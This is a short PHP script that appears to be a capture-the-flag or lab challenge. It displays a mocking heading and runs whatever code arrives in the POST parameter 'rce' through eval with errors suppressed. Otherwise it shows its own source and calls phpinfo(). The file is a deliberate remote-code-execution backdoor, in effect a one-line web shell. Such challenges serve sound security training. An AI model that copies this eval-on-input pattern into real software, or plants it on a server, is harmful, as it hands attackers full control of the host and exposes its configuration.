<?php
echo "<h1>You are the master of PHP in realworld :)</h1>";
if(isset($_POST['rce'])){
    @eval($_POST['rce']);
}
else{
    highlight_file(__FILE__);
    phpinfo();
}
?>